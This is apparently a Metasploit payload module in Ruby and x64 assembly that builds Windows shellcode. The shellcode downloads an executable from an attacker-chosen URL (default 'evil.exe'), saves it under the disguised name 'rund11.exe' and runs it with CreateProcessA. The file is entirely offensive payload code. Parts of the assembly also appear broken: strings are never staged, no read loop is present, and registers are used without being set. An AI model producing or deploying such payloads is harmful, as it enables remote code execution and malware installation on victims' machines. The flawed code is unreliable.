##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule

    CachedSize = 443
  
    include Msf::Payload::Windows
    include Msf::Payload::Single
    include Msf::Payload::Windows::BlockApi_x64
  
    def initialize(info = {})
      super(merge_info(info,
        'Name'          => 'Windows x64 Executable Download (http,https,ftp) and Execute',
        'Description'   => 'Download an EXE from an HTTP(S)/FTP URL and execute it',
        'Author'        =>
          [
            'corelanc0d3r <peter.ve[at]corelan.be>', # Original x86
            'itsmrmonday mrmonday[at]itsmrmonday.com (x64 adaptation)'
          ],
        'License'       => MSF_LICENSE,
        'Platform'      => 'win',
        'Arch'          => ARCH_X64
      ))
  
      # Register command execution options
      register_options(
        [
          OptString.new('URL', [true, "The pre-encoded URL to the executable", "https://localhost:443/evil.exe"]),
          OptString.new('EXE', [true, "Filename to save & run executable on target system", "rund11.exe"])
        ])
    end
  
    #
    # Construct the payload
    #
    def generate(_opts = {})
  
      target_uri = datastore['URL'] || ""
      filename = datastore['EXE'] || ""
      proto = "https"
      dwflags_asm = "mov r9d, 0x08400000 ; dwFlags\n" 
        # 0x80000000 | INTERNET_FLAG_RELOAD
        # 0x04000000 | INTERNET_NO_CACHE_WRITE
        # 0x00800000 | INTERNET_FLAG_SECURE
        # 0x00200000 | INTERNET_FLAG_NO_AUTO_REDIRECT
        # 0x00001000 | INTERNET_FLAG_IGNORE_CERT_CN_INVALID
        # 0x00002000 | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID
        # 0x00000200 ; INTERNET_FLAG_NO_UI
  
      exitfuncs = {
        "THREAD"  => Rex::Text.block_api_hash("kernel32.dll", "ExitThread").to_i(16), # ExitThread
        "PROCESS" => Rex::Text.block_api_hash("kernel32.dll", "ExitProcess").to_i(16), # ExitProcess
        "SEH"     => 0x00000000,
        "NONE"    => 0x00000000
      }
  
      protoflags = {
        "http"  => 0x3,
        "https" => 0x3,
        "ftp"   => 0x1
      }
  
      exitfunc = datastore['EXITFUNC'].upcase
  
      if exitfuncs[exitfunc]
        exitasm = case exitfunc
          when "SEH" then "xor rax,rax\ncall rax"
          when "NONE" then "jmp end"
          else "xor r9d, r9d\nmov rcx, 0\nmov rdx, #{exitfuncs[exitfunc]}\ncall qword ptr [rbp-0x8]"
        end
      end
  
      # Parse URL to get:
      # - Remote host
      # - Port
      # - /path/to/file
      server_uri  = ''
      server_host = ''
      port_nr     = 443 # default
  
      if target_uri.length > 0
  
        if target_uri =~ /^http:/
          proto = "http"
          port_nr = 80
          dwflags_asm = "mov r9d, 0x00400000 ; INTERNET_FLAG_KEEP_CONNECTION"
        end
  
        if target_uri =~ /^ftp:/
          proto = "ftp"
          port_nr = 21
          dwflags_asm = "mov r9d, 0x00200000"
        end
  
        target_uri = target_uri.gsub('http://', '').gsub('https://', '').gsub('ftp://', '')
  
        server_info = target_uri.split("/")
        server_parts = server_info[0].split(":")
        if server_parts.length > 1
          port_nr = Integer(server_parts[1])
        end
  
        server_host = server_parts[0]
        for i in (1..server_info.length - 1)
          server_uri << "/"
          server_uri << server_info[i]
        end
      end
  
      # x64 version of the payload
      payload_data = %Q^
        cld
        call start
        #{asm_block_api}
      start:
        pop rbp
      load_wininet:
        sub rsp, 32
        mov rcx, 0x0074656e696e6977 ; "wininet"
        push rcx
        push rsp
        mov rcx, rsp
        mov rdx, #{Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')}
        call qword ptr [rbp-0x8]
        add rsp, 32
  
      internetopen:
        xor rcx, rcx
        mov rdx, rcx
        mov r8, rcx
        mov r9, rcx
        lea rcx, [rsp+8]
        mov rax, #{Rex::Text.block_api_hash('wininet.dll', 'InternetOpenA')}
        call qword ptr [rbp-0x8]
  
      internetconnect:
        lea rdx, [rsp+32]       ; host
        mov r8d, #{port_nr}
        xor r9d, r9d
        mov [rsp+40], r9d
        mov [rsp+48], r9d
        mov [rsp+56], r9d
        mov [rsp+64], #{protoflags[proto]}
        mov [rsp+72], r9d
        mov [rsp+80], rax
        mov rax, #{Rex::Text.block_api_hash('wininet.dll', 'InternetConnectA')}
        call qword ptr [rbp-0x8]
  
      httpopenrequest:
        xor rcx, rcx
        xor rdx, rdx
        mov r8, rsp
        xor r9d, r9d
        mov [rsp+8], r9d
        #{dwflags_asm}
        mov rax, #{Rex::Text.block_api_hash('wininet.dll', 'HttpOpenRequestA')}
        call qword ptr [rbp-0x8]
  
      httpsendrequest:
        xor rcx, rcx
        xor rdx, rdx
        xor r8, r8
        xor r9, r9
        mov rax, #{Rex::Text.block_api_hash('wininet.dll', 'HttpSendRequestA')}
        call qword ptr [rbp-0x8]
  
      create_file:
        xor rcx, rcx
        mov rdx, rsp
        xor r8, r8
        mov r9d, 2
        mov [rsp+8], 2
        xor rax, rax
        mov [rsp+16], rax
        mov [rsp+24], rax
        mov [rsp+32], rax
        mov rax, #{Rex::Text.block_api_hash('kernel32.dll', 'CreateFileA')}
        call qword ptr [rbp-0x8]
  
      write_file:
        mov rcx, rax
        mov rdx, rbx
        mov r8, rdi
        lea r9, [rsp+8]
        mov rax, #{Rex::Text.block_api_hash('kernel32.dll', 'WriteFile')}
        call qword ptr [rbp-0x8]
  
      close_file:
        mov rcx, rax
        mov rax, #{Rex::Text.block_api_hash('kernel32.dll', 'CloseHandle')}
        call qword ptr [rbp-0x8]
  
      execute_file:
        lea rcx, [rsp+32]
        xor rdx, rdx
        mov r8, rdx
        mov r9, rdx
        mov rax, #{Rex::Text.block_api_hash('kernel32.dll', 'CreateProcessA')}
        call qword ptr [rbp-0x8]
  
      thats_all_folks:
        #{exitasm}
      end:
        ^
        self.assembly = payload_data
        super
      end
    end